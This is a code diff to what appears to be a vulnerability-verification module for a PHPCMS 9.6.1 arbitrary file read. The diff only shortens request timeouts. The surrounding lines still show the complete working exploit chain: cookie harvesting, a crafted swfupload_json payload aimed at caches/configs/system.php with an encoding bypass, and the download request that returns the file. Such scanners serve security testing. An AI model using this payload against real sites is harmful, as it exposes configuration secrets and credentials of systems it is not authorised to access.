@@ -25,7 +25,7 @@ class phpcms_v961_fileread_BaseVerify:
         siteid = ""
         att_json = ""
         try:
-            req1 = requests.get(url_preffix, headers=headers, timeout=10, verify=False)
+            req1 = requests.get(url_preffix, headers=headers, timeout=3, verify=False)
             for cookie in req1.cookies:
                 siteid = cookie.value
             payload = "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&filename=test.jpg&src=%26i%3D3%26d%3D1%26t%3D9999999999%26catid%3D1%26ip%3D8.8.8.8%26m%3D3%26modelid%3D3%26s%3Dcaches%2fconfigs%2fsystem.p%26f%3Dh%25253Cp%26xxxx%3D"
@@ -33,10 +33,10 @@ class phpcms_v961_fileread_BaseVerify:
             post_data = {
                 "userid_flash":siteid
             }
-            req2 = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
+            req2 = requests.post(vulnurl, data=post_data, headers=headers, timeout=3, verify=False)
             for cookie in req2.cookies:
                 att_json = cookie.value
-            req3 = requests.get(self.url+"/index.php?m=content&c=down&a=init&a_k="+att_json, headers=headers, timeout=10, verify=False)
+            req3 = requests.get(self.url+"/index.php?m=content&c=down&a=init&a_k="+att_json, headers=headers, timeout=3, verify=False)
             pattern = '<a.*?href="(.*?)".*?>.*?</a>'
             link = re.search(pattern, req3.text).group(1)
             req4 = requests.get(self.url+"/index.php"+link, headers=headers, verify=False)
